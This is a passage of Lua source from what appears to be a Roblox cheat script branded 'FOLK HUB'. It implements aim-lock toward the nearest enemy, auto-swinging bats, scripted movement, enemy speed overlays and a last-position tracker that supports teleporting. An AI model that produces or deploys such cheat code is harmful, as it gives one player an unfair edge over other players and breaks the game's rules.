                            tl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
                            enemySpeedLabels[player] = tl
                            label = tl
                        end
                    elseif label.Parent and label.Parent.Parent ~= char then
                        local head = char:FindFirstChild("Head")
                        if head then label.Parent.Parent = head end
                    end
                    if label then
                        label.Text = string.format("%.1f", speed)
                        if label.TextColor3 ~= color then label.TextColor3 = color end
                    end
                else
                    local label = enemySpeedLabels[player]
                    if label and label.Parent and label.Parent.Parent then label.Parent.Parent = nil end
                    enemySpeedLabels[player] = nil
                end
            end
        end
    end
    
    function startEnemySpeed()
        if enemySpeedConn then enemySpeedConn:Disconnect() end
        enemySpeedConn = RunService.Heartbeat:Connect(updateEnemySpeedLabels)
    end
    
    function stopEnemySpeed()
        if enemySpeedConn then enemySpeedConn:Disconnect(); enemySpeedConn = nil end
    end
    
    local function getClosestTargetBody()
        local char = LP.Character
        if not char then return nil end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        local rpos = root.Position
        local closest, minDist = nil, _huge
        local plist = _GetPlayersCached()
        for i = 1, #plist do
            local plr = plist[i]
            if plr ~= LP then
                local c = plr.Character
                if c then
                    local tRoot = c:FindFirstChild("HumanoidRootPart")
                    if tRoot then
                        local hum = c:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health > 0 then
                            local dx = tRoot.Position.X - rpos.X
                            local dy = tRoot.Position.Y - rpos.Y
                            local dz = tRoot.Position.Z - rpos.Z
                            local d = dx*dx + dy*dy + dz*dz
                            if d < minDist then minDist = d; closest = tRoot end
                        end
                    end
                end
            end
        end
        return closest
    end
    
    local function _bodyLockTick()
        local char = LP.Character
        if not char then return end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return end
        local hum = char:FindFirstChildOfClass("Humanoid")
        if not hum then return end
        local target = getClosestTargetBody()
        if not target then
            if not hum.AutoRotate then hum.AutoRotate = true end
            return
        end
        local dist = (target.Position - root.Position).Magnitude
        if dist > bodyLockRange then
            if not hum.AutoRotate then hum.AutoRotate = true end
            return
        end
        if hum.AutoRotate then hum.AutoRotate = false end
        local targetVel = target.AssemblyLinearVelocity
        local speed3 = targetVel.Magnitude
        local predictTime = _clamp(speed3 / 80, 0.08, 0.35)
        local predictedPos = target.Position + targetVel * predictTime
        local targetHead = target.Parent and target.Parent:FindFirstChild("Head")
        local targetHeight = targetHead and targetHead.Position.Y or target.Position.Y
        local myHeight = root.Position.Y + (hum.HipHeight or 0)
        local heightDiff = targetHeight - myHeight
        local verticalCorrection = _clamp(heightDiff * 0.15, -1.5, 1.5)
        local flatTarget = _V3new(predictedPos.X, root.Position.Y + verticalCorrection, predictedPos.Z)
        local toPredict = flatTarget - root.Position
        if toPredict.Magnitude > 0.1 then
            local goalCF = _CFlookAt(root.Position, flatTarget)
            local diffCF = root.CFrame:Inverse() * goalCF
            local _, ry, _ = diffCF:ToEulerAnglesXYZ()
            ry = _clamp(ry, -2.5, 2.5)
            root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(_V3new(0, ry * 42, 0))
        end
    end
    
    function startBodyLock()
        if _bodyLockConn then _bodyLockConn:Disconnect() end
        local acc = 0
        _bodyLockConn = RunService.Heartbeat:Connect(function(dt)
            if not bodyLockEnabled then return end
            if _blSuppressCount > 0 then return end
            acc = acc + dt
            if acc < 0.033 then return end
            acc = 0
            _bodyLockTick()
        end)
    end
    
    function stopBodyLock()
        if _bodyLockConn then
            _bodyLockConn:Disconnect()
            _bodyLockConn = nil
        end
        local c = LP.Character
        local root = c and c:FindFirstChild("HumanoidRootPart")
        if root then
            root.AssemblyAngularVelocity = _V3zero
            root.AssemblyLinearVelocity = _V3new(root.AssemblyLinearVelocity.X, -0.1, root.AssemblyLinearVelocity.Z)
        end
        local hum2 = c and c:FindFirstChildOfClass("Humanoid")
        if hum2 then hum2.AutoRotate = true end
    end
    
    function _suppressBodyLock()
        _blSuppressCount = _blSuppressCount + 1
        if _blSuppressCount == 1 and bodyLockEnabled then
            _blWasEnabled = true
            stopBodyLock()
            if bodyLockSetVisual then bodyLockSetVisual(false) end
            if _blRestoreTimer then
                task.cancel(_blRestoreTimer)
                _blRestoreTimer = nil
            end
            _blSmoothRestore = false
        end
    end
    
    function _unsuppressBodyLock(delayed)
        if _blSuppressCount > 0 then
            _blSuppressCount = _blSuppressCount - 1
        end
        if _blSuppressCount == 0 and _blWasEnabled then
            _blWasEnabled = false
            if _blRestoreTimer then
                pcall(task.cancel, _blRestoreTimer)
                _blRestoreTimer = nil
            end
            local function restore()
                _blRestoreTimer = nil
                if bodyLockEnabled then
                    _blSmoothRestore = true
                    startBodyLock()
                    if bodyLockSetVisual then bodyLockSetVisual(true) end
                    task.delay(0.5, function() _blSmoothRestore = false end)
                end
            end
            if delayed then
                _blRestoreTimer = task.delay(1, restore)
            else
                restore()
            end
        end
    end
    
    function setupSpeedIndicator(char)
        local head = char:WaitForChild("Head", 5)
        if not head then return end
        local oldBB = head:FindFirstChild("YoutSpeedIndicator")
        if oldBB then oldBB:Destroy() end
        local oldDiscord = head:FindFirstChild("DiscordText")
        if oldDiscord then oldDiscord:Destroy() end
    
        local bb = Instance.new("BillboardGui", head)
        bb.Name = "YoutSpeedIndicator"
        bb.Size = UDim2.fromOffset(200, 58)
        bb.StudsOffset = Vector3.new(0, 3.2, 0)
        bb.AlwaysOnTop = true
        bb.LightInfluence = 0
        bb.MaxDistance = 0
    
        local discordLabel = Instance.new("TextLabel", bb)
        discordLabel.Name = "DiscordText"
        discordLabel.Size = UDim2.new(1, 0, 0, 28)
        discordLabel.Position = UDim2.new(0, 0, 0, 0)
        discordLabel.BackgroundTransparency = 1
        discordLabel.Text = "『FOLK HUB』"
        discordLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
        discordLabel.Font = Enum.Font.GothamBlack
        discordLabel.TextSize = 19
        discordLabel.TextXAlignment = Enum.TextXAlignment.Center
        discordLabel.TextYAlignment = Enum.TextYAlignment.Center
        discordLabel.TextStrokeTransparency = 0
        discordLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        local dlStroke = Instance.new("UIStroke", discordLabel)
        dlStroke.Color = Color3.fromRGB(255, 255, 255)
        dlStroke.Thickness = 1.5
        dlStroke.Transparency = 0.2
        applyShimmerToText(discordLabel, 0.9)
    
        speedLabel = Instance.new("TextLabel", bb)
        speedLabel.Name = "SpeedLabel"
        speedLabel.Size = UDim2.new(1, 0, 0, 30)
        speedLabel.Position = UDim2.new(0, 0, 0, 28)
        speedLabel.BackgroundTransparency = 1
        speedLabel.Text = "0.0  -  " .. getSpeedModeName()
        speedLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
        speedLabel.Font = Enum.Font.GothamBlack
        speedLabel.TextSize = 22
        speedLabel.TextXAlignment = Enum.TextXAlignment.Center
        speedLabel.TextYAlignment = Enum.TextYAlignment.Center
        speedLabel.TextStrokeTransparency = 0
        speedLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
        local slStroke = Instance.new("UIStroke", speedLabel)
        slStroke.Color = Color3.fromRGB(255, 255, 255)
        slStroke.Thickness = 1.5
        slStroke.Transparency = 0.2
        applyShimmerToText(speedLabel, 0.9)
    end
    
    local unwalkSavedAnimate = nil
    
    function startUnwalk()
        local c = LP.Character
        if not c then return end
        local hum = c:FindFirstChildOfClass("Humanoid")
        if hum then
            for _, t in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() t:Stop() end) end
        end
        local anim = c:FindFirstChild("Animate")
        if anim then
            unwalkSavedAnimate = anim:Clone()
            anim:Destroy()
        end
    end
    
    function stopUnwalk()
        local c = LP.Character
        if c then
            local existing = c:FindFirstChild("Animate")
            if not existing then
                local src = game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts")
                local starterAnim = src and src:FindFirstChild("Animate")
                if starterAnim then
                    starterAnim:Clone().Parent = c
                elseif unwalkSavedAnimate then
                    unwalkSavedAnimate:Clone().Parent = c
                end
            end
        end
        unwalkSavedAnimate = nil
    end
    
    function refreshSpeedModeLabel()
        if modeValLbl then
            if laggerCarryToggled then modeValLbl.Text = "Lagger Carry"
            elseif laggerToggled then modeValLbl.Text = "Lagger Normal"
            elseif speedMode then modeValLbl.Text = "Carry"
            else modeValLbl.Text = "Normal" end
        end
        if setCarryModeVisual then setCarryModeVisual(speedMode) end
        if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
        if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
    end
    
    function resetMovementState()
        refreshSpeedModeLabel()
        if mobSetCarry then mobSetCarry(speedMode) end
        if setLaggerModeVisual then setLaggerModeVisual(laggerToggled) end
        if setLaggerCarryVisual then setLaggerCarryVisual(laggerCarryToggled) end
    end
    
    function toggleCarryMode()
        if laggerToggled or laggerCarryToggled then
            laggerToggled = false; laggerCarryToggled = false; speedMode = true
        else speedMode = not speedMode end
        resetMovementState()
        if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
    end
    
    function toggleLaggerMode()
        if laggerCarryToggled then laggerCarryToggled = false end
        speedMode = false; laggerToggled = not laggerToggled
        resetMovementState()
        if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
    end
    function toggleLaggerCarryMode()
        if laggerToggled then laggerToggled = false end
        speedMode = false; laggerCarryToggled = not laggerCarryToggled
        resetMovementState()
        if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
    end
    
    function toggleLaggerCycle()
        if speedMode then
            speedMode = false
            laggerToggled = true
            laggerCarryToggled = false
        elseif laggerToggled then
            speedMode = false
            laggerToggled = false
            laggerCarryToggled = true
        else
            speedMode = true
            laggerToggled = false
            laggerCarryToggled = false
        end
        resetMovementState()
        if _G.__YoutApplySpeedNow then pcall(_G.__YoutApplySpeedNow) end
    end
    
    function stopAutoLeft()
        if alConn then alConn:Disconnect(); alConn = nil end
        alPhase = 1
        local char = LP.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum:Move(_V3zero, false) end
        end
        if autoLeftSetVisual then autoLeftSetVisual(false) end
        if mobSetAutoLeft then mobSetAutoLeft(false) end
        _unsuppressBodyLock(true)
    end
    
    function startAutoLeft()
        if autoRightEnabled then
            autoRightEnabled = false
            stopAutoRight()
            if autoRightSetVisual then autoRightSetVisual(false) end
            if mobSetAutoRight then mobSetAutoRight(false) end
        end
        if autoBatV2Enabled then toggleBatV2() end
        disableAllAimbots()
        _suppressBodyLock()
        if alConn then alConn:Disconnect() end
        alPhase = 1
        alConn = RunService.Heartbeat:Connect(function()
            if not autoLeftEnabled then return end
            local char = LP.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not root or not hum then return end
            local spd = NS
            if alPhase == 1 then
                local tgt = _V3new(AP.L1.X, root.Position.Y, AP.L1.Z)
                if (tgt - root.Position).Magnitude < 1 then
                    alPhase = 2
                    local d = AP.L2 - root.Position
                    local mv = _V3new(d.X, 0, d.Z).Unit
                    hum:Move(mv, false)
                    root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
                    return
                end
                local d = AP.L1 - root.Position
                local mv = _V3new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
            elseif alPhase == 2 then
                local tgt = _V3new(AP.L2.X, root.Position.Y, AP.L2.Z)
                if (tgt - root.Position).Magnitude < 1 then
                    hum:Move(_V3zero, false)
                    root.AssemblyLinearVelocity = _V3zero
                    autoLeftEnabled = false
                    if alConn then alConn:Disconnect(); alConn = nil end
                    alPhase = 1
                    if autoLeftSetVisual then autoLeftSetVisual(false) end
                    if mobSetAutoLeft then mobSetAutoLeft(false) end
                    _unsuppressBodyLock(true)
                    local facePos = _V3new(AP.L_FACE.X, root.Position.Y, AP.L_FACE.Z)
                    if (facePos - root.Position).Magnitude > 0.01 then
                        root.CFrame = _CFnew(root.Position, facePos)
                    end
                    return
                end
                local d = AP.L2 - root.Position
                local mv = _V3new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
            end
        end)
    end
    
    function stopAutoRight()
        if arConn then arConn:Disconnect(); arConn = nil end
        arPhase = 1
        local char = LP.Character
        if char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum:Move(_V3zero, false) end
        end
        if autoRightSetVisual then autoRightSetVisual(false) end
        if mobSetAutoRight then mobSetAutoRight(false) end
        _unsuppressBodyLock(true)
    end
    
    function startAutoRight()
        if autoLeftEnabled then
            autoLeftEnabled = false
            stopAutoLeft()
            if autoLeftSetVisual then autoLeftSetVisual(false) end
            if mobSetAutoLeft then mobSetAutoLeft(false) end
        end
        if autoBatV2Enabled then toggleBatV2() end
        disableAllAimbots()
        _suppressBodyLock()
        if arConn then arConn:Disconnect() end
        arPhase = 1
        arConn = RunService.Heartbeat:Connect(function()
            if not autoRightEnabled then return end
            local char = LP.Character
            if not char then return end
            local root = char:FindFirstChild("HumanoidRootPart")
            local hum = char:FindFirstChildOfClass("Humanoid")
            if not root or not hum then return end
            local spd = NS
            if arPhase == 1 then
                local tgt = _V3new(AP.R1.X, root.Position.Y, AP.R1.Z)
                if (tgt - root.Position).Magnitude < 1 then
                    arPhase = 2
                    local d = AP.R2 - root.Position
                    local mv = _V3new(d.X, 0, d.Z).Unit
                    hum:Move(mv, false)
                    root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
                    return
                end
                local d = AP.R1 - root.Position
                local mv = _V3new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
            elseif arPhase == 2 then
                local tgt = _V3new(AP.R2.X, root.Position.Y, AP.R2.Z)
                if (tgt - root.Position).Magnitude < 1 then
                    hum:Move(_V3zero, false)
                    root.AssemblyLinearVelocity = _V3zero
                    autoRightEnabled = false
                    if arConn then arConn:Disconnect(); arConn = nil end
                    arPhase = 1
                    if autoRightSetVisual then autoRightSetVisual(false) end
                    if mobSetAutoRight then mobSetAutoRight(false) end
                    _unsuppressBodyLock(true)
                    local facePos = _V3new(AP.R_FACE.X, root.Position.Y, AP.R_FACE.Z)
                    if (facePos - root.Position).Magnitude > 0.01 then
                        root.CFrame = _CFnew(root.Position, facePos)
                    end
                    return
                end
                local d = AP.R2 - root.Position
                local mv = _V3new(d.X, 0, d.Z).Unit
                hum:Move(mv, false)
                root.AssemblyLinearVelocity = _V3new(mv.X * spd, root.AssemblyLinearVelocity.Y, mv.Z * spd)
            end
        end)
    end
    
    function getClosestTarget()
        local char = LP.Character
        if not char then return nil end
        local root = char:FindFirstChild("HumanoidRootPart")
        if not root then return nil end
        local rpos = root.Position
        local closest, minDist = nil, _huge
        local plist = _GetPlayersCached()
        for i = 1, #plist do
            local plr = plist[i]
            if plr ~= LP then
                local c = plr.Character
                if c then
                    local tRoot = c:FindFirstChild("HumanoidRootPart")
                    if tRoot then
                        local hum = c:FindFirstChildOfClass("Humanoid")
                        if hum and hum.Health > 0 then
                            local dx = tRoot.Position.X - rpos.X
                            local dy = tRoot.Position.Y - rpos.Y
                            local dz = tRoot.Position.Z - rpos.Z
                            local d = dx*dx + dy*dy + dz*dz
                            if d < minDist then minDist = d; closest = tRoot end
                        end
                    end
                end
            end
        end
        return closest
    end
    
    function trySwing()
        pcall(function()
            local char = LP.Character
            if not char then return end
            local currentTool = char:FindFirstChildOfClass("Tool")
            if currentTool and not isBatTool(currentTool) then return end
            local bat = findBat()
            if bat then
                if bat.Parent ~= char then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then pcall(function() hum:EquipTool(bat) end) end
                end
                pcall(function() bat:Activate() end)
            end
        end)
    end
    
    function stopAimbotAdapt()
        if _aimbotConn then
            pcall(function() _aimbotConn:Disconnect() end)
            _aimbotConn = nil
        end
        local char = LP.Character
        local root = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if hum then
            hum.AutoRotate = (_prevAutoRotate == nil) and true or _prevAutoRotate
            hum.PlatformStand = false
            pcall(function() hum:ChangeState(Enum.HumanoidStateType.Running) end)
        end
        if root then
            root.AssemblyLinearVelocity = _V3new(0, -0.1, 0)
            root.AssemblyAngularVelocity = _V3zero
        end
        _prevAutoRotate = nil
        lastMoveDir = _V3zero
        _unsuppressBodyLock(true)
    end
    
    function disableAutoBat()
        autoBatEnabled = false
        if autoBatSetVisual then autoBatSetVisual(false) end
        if mobSetAutoBat then mobSetAutoBat(false) end
        stopAimbotAdapt()
    end
    
    function _forceDisableTpBatForAutoBat()
        if batDesyncTpEnabled then
            stopBatDesyncTp()
        end
    end
    
    function enableAutoBat()
        if autoLeftEnabled then
            autoLeftEnabled = false
            if autoLeftSetVisual then autoLeftSetVisual(false) end
            stopAutoLeft()
        end
        if autoRightEnabled then
            autoRightEnabled = false
            if autoRightSetVisual then autoRightSetVisual(false) end
            stopAutoRight()
        end
        if autoBatV2Enabled then disableBatV2() end
        _forceDisableTpBatForAutoBat()
        autoBatEnabled = true
        if autoBatSetVisual then autoBatSetVisual(true) end
        if mobSetAutoBat then mobSetAutoBat(true) end
        startAimbotAdapt()
    end
    
    -- =====================================================================
    -- [YOUT] Marcador azul de ultima posicion
    -- =====================================================================
    do
        local YOUT_MARKER_DISTANCE   = 3
        local YOUT_MIN_X, YOUT_MAX_X = -536.2, -422
        local YOUT_MIN_Y, YOUT_MAX_Y = -10,    75
        local YOUT_MIN_Z, YOUT_MAX_Z = -71.8, 192.9
        local YOUT_GROUND_Y          = -7
        local YOUT_LOOKBACK          = 0.2
        local YOUT_SAMPLE_INTERVAL   = 1 / 60
    
        local markerState = {
            markerLocked = false,
            markerTarget = nil,
            lastMarker   = nil,
            samples      = {},
            accumulator  = 0,
        }
    
        local function isInsideAllowedArea(pos)
            if not pos then return false end
            return pos.X >= YOUT_MIN_X and pos.X <= YOUT_MAX_X
               and pos.Y >= YOUT_MIN_Y and pos.Y <= YOUT_MAX_Y
               and pos.Z >= YOUT_MIN_Z and pos.Z <= YOUT_MAX_Z
        end
    
        local function finiteVector(v)
            return v ~= nil
                and v.X == v.X and v.Y == v.Y and v.Z == v.Z
                and math.abs(v.X) < 1e7
                and math.abs(v.Y) < 1e7
                and math.abs(v.Z) < 1e7
        end
    
        local function hideMarkerVisuals(marker)
            if not marker then return end
            pcall(function()
                marker.Transparency = 1
                local s = marker:FindFirstChild("AlwaysOnTopSphere")
                if s then s.Visible = false end
                local h = marker:FindFirstChild("LastPositionHighlight")
                if h then h.Enabled = false end
                local b = marker:FindFirstChild("LastPositionLabel")
                if b then b.Enabled = false end
            end)
        end
    
        local function clearLastMarker()
            markerState.markerLocked = false
            if markerState.lastMarker then
                hideMarkerVisuals(markerState.lastMarker)
            end
        end
    
        local function getLastMarkerCFrame()
            local marker = markerState.lastMarker
            if not (markerState.markerLocked and marker and marker.Parent and marker.Transparency < 1) then
                return nil
            end
            local tracked = markerState.markerTarget
            local trackedRoot = tracked and tracked.Character
                                 and tracked.Character:FindFirstChild("HumanoidRootPart")
            if trackedRoot and isInsideAllowedArea(trackedRoot.Position) then
                clearLastMarker()
                return nil
            end
            local myChar = LP.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then return marker.CFrame end
            local away = Vector3.new(
                myRoot.Position.X - marker.Position.X, 0,
                myRoot.Position.Z - marker.Position.Z
            )
            if away.Magnitude <= 0.05 then
                local look = marker.CFrame.LookVector
                away = Vector3.new(-look.X, 0, -look.Z)
            end
            if away.Magnitude <= 0.05 then away = Vector3.new(0, 0, 1) end
            local teleportPos = marker.Position + away.Unit * YOUT_MARKER_DISTANCE
            local flat = Vector3.new(
                marker.Position.X - teleportPos.X, 0,
                marker.Position.Z - teleportPos.Z
            )
            if flat.Magnitude > 0.05 then
                return _CFlookAt(teleportPos, teleportPos + flat.Unit)
            end
            return _CFnew(teleportPos)
        end
    
        local function createOrUpdateMarker(targetCFrame)
            if markerState.markerLocked then return end
            local tracked = markerState.markerTarget
            if not tracked or tracked.Parent ~= Players then return end
            local char = tracked.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            local hum  = char and char:FindFirstChildOfClass("Humanoid")
            if not root or not hum or hum.Health <= 0 then return end
            if not finiteVector(root.Position) then return end
            if isInsideAllowedArea(root.Position) then return end
            if not targetCFrame or not isInsideAllowedArea(targetCFrame.Position) then return end
    
            local groundCF = _CFnew(
                targetCFrame.Position.X,
                YOUT_GROUND_Y,
                targetCFrame.Position.Z
            ) * targetCFrame.Rotation
    
            local marker = markerState.lastMarker
            if not marker or not marker.Parent then
                marker = Instance.new("Part")
                marker.Name         = "YoutTPBatLastPosition"
                marker.Shape        = Enum.PartType.Ball
                marker.Size         = Vector3.new(3, 3, 3)
                marker.Color        = Color3.fromRGB(0, 110, 255)
                marker.Material     = Enum.Material.Neon
                marker.Anchored     = true
                marker.CanCollide   = false
                marker.CanTouch     = false
                marker.CanQuery     = false
                marker.CastShadow   = false
                marker.Parent       = Workspace
    
                local overlay = Instance.new("SphereHandleAdornment")
                overlay.Name        = "AlwaysOnTopSphere"
                overlay.Adornee     = marker
                overlay.Radius      = 1.55
                overlay.Color3      = Color3.fromRGB(0, 125, 255)
                overlay.Transparency = 0.05
                overlay.AlwaysOnTop = true
                overlay.Visible     = true
                overlay.ZIndex      = 10
                overlay.Parent      = marker
    
                local hl = Instance.new("Highlight")
                hl.Name = "LastPositionHighlight"
                hl.Adornee = marker
                hl.FillColor = Color3.fromRGB(0, 110, 255)
                hl.FillTransparency = 0.15
                hl.OutlineColor = Color3.fromRGB(120, 200, 255)
                hl.OutlineTransparency = 0
                hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
                hl.Enabled = true
                hl.Parent = marker
    
                local bb = Instance.new("BillboardGui")
                bb.Name = "LastPositionLabel"
                bb.Size = UDim2.new(0, 110, 0, 20)
                bb.StudsOffset = Vector3.new(0, 2.1, 0)
                bb.AlwaysOnTop = true
                bb.Adornee = marker
                bb.Parent = marker
    
                local lbl = Instance.new("TextLabel")
                lbl.Name = "Text"
                lbl.Size = UDim2.fromScale(1, 1)
                lbl.BackgroundTransparency = 1
                lbl.Text = "ultima posicion"
                lbl.TextColor3 = Color3.fromRGB(220, 235, 255)
                lbl.TextStrokeColor3 = Color3.fromRGB(0, 35, 90)
                lbl.TextStrokeTransparency = 0.25
                lbl.TextSize = 11
                lbl.Font = Enum.Font.GothamMedium
                lbl.Parent = bb
    
                markerState.lastMarker = marker
            end
    
            marker.Transparency = 0
            local s = marker:FindFirstChild("AlwaysOnTopSphere");      if s then s.Visible = true end
            local h = marker:FindFirstChild("LastPositionHighlight");  if h then h.Enabled = true end
            local b = marker:FindFirstChild("LastPositionLabel");      if b then b.Enabled = true end
            marker.CFrame = groundCF
            markerState.markerLocked = true
        end
    
        local function snapshotBeforeExit(history, now)
            if not history or #history == 0 then return nil end
            local cutoff = now - YOUT_LOOKBACK
            local selected
            for _, entry in ipairs(history) do
                if entry.time <= cutoff then selected = entry else break end
            end
            return selected or history[1]
        end
    
        local function pickClosestEnemy(myRoot)
            local closest, bestDistSq = nil, _huge
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr ~= LP and plr.Character then
                    local r = plr.Character:FindFirstChild("HumanoidRootPart")
                    local h = plr.Character:FindFirstChildOfClass("Humanoid")
                    if r and h and h.Health > 0 and finiteVector(r.Position) then
                        local d = (r.Position - myRoot.Position).Magnitude
                        if d < bestDistSq then closest = plr; bestDistSq = d end
                    end
                end
            end
            return closest
        end
    
        local function monitorLastTarget()
            local myChar = LP.Character
            local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
            if not myRoot then return end
    
            local tracked = markerState.markerTarget
            if tracked and tracked.Parent == Players then
                local char = tracked.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local hum  = char and char:FindFirstChildOfClass("Humanoid")
                local sample = markerState.samples[tracked] or {}
                markerState.samples[tracked] = sample
    
                if root and hum and hum.Health > 0 and finiteVector(root.Position) then
                    if isInsideAllowedArea(root.Position) then
                        local now = _tick()
                        if markerState.markerLocked then sample.history = {} end
                        sample.history = sample.history or {}
                        table.insert(sample.history, { time = now, safeCFrame = root.CFrame })
                        while sample.history[1]
                            and now - sample.history[1].time > (YOUT_LOOKBACK + 0.25) do
                            table.remove(sample.history, 1)
                        end
                        sample.safeCFrame = root.CFrame
                        if markerState.markerLocked then clearLastMarker() end
                    else
                        local snap = snapshotBeforeExit(sample.history, _tick())
                        createOrUpdateMarker((snap and snap.safeCFrame) or sample.safeCFrame)
                    end
                end
    
                if (hum and hum.Health <= 0) or (not root and not sample.safeCFrame) then
                    markerState.markerTarget = nil
                    clearLastMarker()
                else
                    return
                end
            end
    
            local closest = pickClosestEnemy(myRoot)
            if closest then
                markerState.markerTarget = closest
                local r = closest.Character:FindFirstChild("HumanoidRootPart")
                if r then
                    local sample = markerState.samples[closest] or {}
                    markerState.samples[closest] = sample
                    sample.safeCFrame = r.CFrame
                    sample.history = { { time = _tick(), safeCFrame = r.CFrame } }
                end
            end
        end
    
        local monitorConn = RunService.Heartbeat:Connect(function(dt)
            markerState.accumulator = markerState.accumulator + (dt or 0)
            if markerState.accumulator < YOUT_SAMPLE_INTERVAL then return end
            markerState.accumulator = markerState.accumulator % YOUT_SAMPLE_INTERVAL
            pcall(monitorLastTarget)
        end)
    
        _G.YoutGetLastMarkerCFrame = getLastMarkerCFrame
        _G.YoutClearLastMarker     = clearLastMarker
        _G.YoutMarkerConn          = monitorConn
    
        LP.CharacterAdded:Connect(function()
            clearLastMarker()
            markerState.markerTarget = nil
            markerState.samples      = {}
        end)
    end
    
    function findBat()
        local char = LP.Character
        if not char then return nil end
        for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
            local t = char:FindFirstChild(name)
            if t and t:IsA("Tool") then return t end
        end
        local bp = LP:FindFirstChildOfClass("Backpack")
        if bp then
            for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
                local t = bp:FindFirstChild(name)
                if t and t:IsA("Tool") then
                    local hum = char:FindFirstChildOfClass("Humanoid")
                    if hum then pcall(function() hum:EquipTool(t) end) end
                    return t
                end
            end
        end
        for _, ch in ipairs(char:GetChildren()) do
            if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then
                return ch
            end
        end
        return nil
    end
    
    function isBatTool(tool)
        if not tool then return false end
        for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
            if tool.Name == name then return true end
        end
        return tool.Name:lower():find("bat") or tool.Name:lower():find("slap")
    end
    
    function findBatForCounter()
        local char = LP.Character
        if not char then return nil end
        local backpack = LP:FindFirstChildOfClass("Backpack")
        for _, name in ipairs(BAT_COUNTER_SLAP_LIST) do
            local tool = char:FindFirstChild(name) or (backpack and backpack:FindFirstChild(name))
            if tool then return tool end
        end
        for _, child in ipairs(char:GetChildren()) do
            if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                return child
            end
        end
        if backpack then
            for _, child in ipairs(backpack:GetChildren()) do
                if child:IsA("Tool") and (child.Name:lower():find("bat") or child.Name:lower():find("slap")) then
                    return child
                end
            end
        end
        return nil
    end
    
    function swingBatForCounter(bat, character)
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if bat.Parent ~= character and humanoid then
            pcall(function() humanoid:EquipTool(bat) end)
            task.wait(0.05)
        end
        local remote = bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
        if remote and remote:IsA("RemoteEvent") then
            pcall(function() remote:FireServer() end)
            task.wait(0.1)
            pcall(function() remote:FireServer() end)
        else
            pcall(function() bat:Activate() end)
            task.wait(0.1)
            pcall(function() bat:Activate() end)
        end
    end
    
    batCounterDebounce = false
    
    function stopBatCounter()
        if Conns.batCounter then
            Conns.batCounter:Disconnect()
            Conns.batCounter = nil
        end
        batCounterDebounce = false
    end
    
    function startBatCounter()
        if Conns.batCounter then return end
        Conns.batCounter = RunService.Heartbeat:Connect(function()
            if not batCounterEnabled then return end
            if batCounterDebounce then return end
            local character = LP.Character
            if not character then return end
            local humanoid = character:FindFirstChildOfClass("Humanoid")
            if not humanoid then return end
            local state = humanoid:GetState()
            if state == Enum.HumanoidStateType.Physics or state == Enum.HumanoidStateType.Ragdoll or state == Enum.HumanoidStateType.FallingDown then
                batCounterDebounce = true
                _suppressBodyLock()
                task.spawn(function()
                    task.wait(0.15)
                    local bat = findBatForCounter()
                    if bat then swingBatForCounter(bat, character) end
                    task.wait(0.3)
                    batCounterDebounce = false
                    _unsuppressBodyLock(true)
                end)
            end
        end)
    end
    
    function findMedusa()
        local c = LP.Character
        if not c then return nil end
        for _, t in ipairs(c:GetChildren()) do
            if t:IsA("Tool") then
                local n = t.Name:lower()
                if n:find("medusa") or n:find("head") or n:find("stone") then return t end
            end
        end
        local bp = LP:FindFirstChild("Backpack")
        if bp then
            for _, t in ipairs(bp:GetChildren()) do
                if t:IsA("Tool") then
                    local n = t.Name:lower()
                    if n:find("medusa") or n:find("head") or n:find("stone") then return t end
                end
            end
        end
        return nil
    end
    
    function useMedusaCounter()
        if medusaDebounce then return end
        if _tick() - medusaLastUsed < MEDUSA_COOLDOWN then return end
        local c = LP.Character
        if not c then return end
        medusaDebounce = true
        local med = findMedusa()
        if not med then medusaDebounce = false; return end
        if med.Parent ~= c then
